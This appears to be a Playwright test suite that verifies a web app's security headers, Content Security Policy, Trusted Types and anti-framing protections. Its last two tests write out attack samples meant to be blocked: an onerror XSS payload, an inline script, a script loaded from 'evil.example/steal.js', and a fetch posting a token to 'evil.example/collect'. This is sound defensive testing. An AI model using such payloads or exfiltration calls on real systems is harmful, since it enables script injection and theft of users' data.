import { expect, test, type Page } from '@playwright/test';
import { createOwner, signIn } from './helpers';

/**
 * Runs the main flows against the production build served with the real
 * security headers and fails on any CSP or Trusted Types violation.
 */
async function trackViolations(page: Page) {
  const violations: string[] = [];
  await page.addInitScript(() => {
    document.addEventListener('securitypolicyviolation', (e) => {
      (window as unknown as { __csp: string[] }).__csp ??= [];
      (window as unknown as { __csp: string[] }).__csp.push(`${e.violatedDirective} ${e.blockedURI}`);
    });
  });
  page.on('console', (m) => {
    if (/Content Security Policy|Trusted Type|TrustedHTML|TrustedScript/i.test(m.text())) violations.push(m.text());
  });
  return async () => [...violations, ...((await page.evaluate(() => (window as unknown as { __csp?: string[] }).__csp ?? [])) as string[])];
}

test('production build sends the security headers', async ({ request }) => {
  const res = await request.get('/');
  const h = res.headers();
  expect(h['content-security-policy']).toContain("script-src 'self'");
  expect(h['content-security-policy']).toContain("frame-ancestors 'none'");
  expect(h['content-security-policy']).toContain("require-trusted-types-for 'script'");
  expect(h['content-security-policy']).toContain("object-src 'none'");
  expect(h['x-content-type-options']).toBe('nosniff');
  expect(h['x-frame-options']).toBe('DENY');
  expect(h['referrer-policy']).toBe('strict-origin-when-cross-origin');
  expect(h['permissions-policy']).toContain('camera=()');
  const html = await res.text();
  expect(html).toContain('http-equiv="Content-Security-Policy"');
  expect(html).not.toMatch(/<script>(?!<\/script>)/); // no inline script bodies
});

test('the app runs under the CSP without violations', async ({ page }) => {
  const violations = await trackViolations(page);
  const email = await createOwner('csp');
  await signIn(page, email);
  await expect(page.getByText('This is your real workspace')).toBeVisible();

  // Exercise the parts most likely to need inline script/styles or DOM sinks.
  await page.keyboard.press('Control+k');
  await expect(page.getByRole('combobox', { name: /Search pages/ })).toBeVisible();
  await page.keyboard.press('Escape');
  await page.getByRole('button', { name: 'Personal workspace menu' }).click();
  await page.getByRole('menuitem', { name: 'Keyboard shortcuts' }).click();
  await expect(page.getByRole('dialog', { name: 'Keyboard shortcuts' })).toBeVisible();
  await page.keyboard.press('Escape');

  await page.goto('/settings');
  await page.getByLabel('Display currency').selectOption('CHF');
  await page.getByRole('button', { name: 'Save changes' }).click();
  await expect(page.getByText('Settings saved')).toBeVisible();
  await page.getByRole('button', { name: 'Switch to light theme' }).click();
  await expect(page.locator('html')).toHaveAttribute('data-theme', 'light');

  await page.goto('/account');
  await expect(page.getByRole('heading', { name: 'Security activity' })).toBeVisible();
  await expect(page.locator('.recharts-surface').first()).toBeVisible();
  await expect(page.getByText('Live', { exact: true }).first()).toBeVisible(); // Realtime websocket allowed by connect-src

  await page.goto('/analytics');
  await page.getByRole('heading', { level: 1, name: 'Analytics & Risk' }).waitFor();

  expect(await violations()).toEqual([]);
});

test('the app cannot be framed by another site', async ({ page }) => {
  const refused: string[] = [];
  page.on('console', (m) => m.text().includes('frame-ancestors') && refused.push(m.text()));
  await page.setContent('<iframe src="http://localhost:4173/sign-in" width="400" height="300"></iframe>');
  await page.waitForTimeout(1500);
  const frame = page.frames()[1];
  // The browser replaces a refused frame with its own error page.
  expect(frame.url()).toMatch(/^chrome-error:/);
  await expect(frame.getByRole('heading', { name: 'Sign in' })).toHaveCount(0);
  expect(refused.join(' ')).toContain("frame-ancestors 'none'");
});

test('injected scripts are blocked (CSP + Trusted Types)', async ({ page }) => {
  await page.goto('/sign-in');
  await expect(page.getByRole('heading', { name: 'Sign in' })).toBeVisible();
  const result = await page.evaluate(async () => {
    const w = window as unknown as { __pwned?: number };
    const outcomes: Record<string, string> = {};
    // 1. Classic DOM XSS sink.
    try {
      document.body.insertAdjacentHTML('beforeend', '<img src="x" onerror="window.__pwned=1">');
      outcomes.innerHTML = 'allowed';
    } catch (e) {
      outcomes.innerHTML = (e as Error).name;
    }
    // 2. Script element with inline code.
    try {
      const s = document.createElement('script');
      s.textContent = 'window.__pwned = 2';
      document.body.appendChild(s);
      outcomes.inlineScript = 'allowed';
    } catch (e) {
      outcomes.inlineScript = (e as Error).name;
    }
    // 3. Script from a foreign origin.
    const ext = document.createElement('script');
    try {
      ext.src = 'https://evil.example/steal.js';
      document.body.appendChild(ext);
      outcomes.foreignScript = 'appended';
    } catch (e) {
      outcomes.foreignScript = (e as Error).name;
    }
    await new Promise((r) => setTimeout(r, 500));
    return { outcomes, pwned: w.__pwned ?? null };
  });
  expect(result.pwned).toBeNull();
  expect(result.outcomes.innerHTML).toBe('TypeError'); // Trusted Types refuses raw HTML
  expect(result.outcomes.inlineScript).toBe('TypeError');
});

test('the browser cannot send data to unapproved hosts', async ({ page }) => {
  await page.goto('/sign-in');
  const outcome = await page.evaluate(async () => {
    try {
      await fetch('https://evil.example/collect', { method: 'POST', body: 'token' });
      return 'sent';
    } catch {
      return 'blocked';
    }
  });
  expect(outcome).toBe('blocked');
});
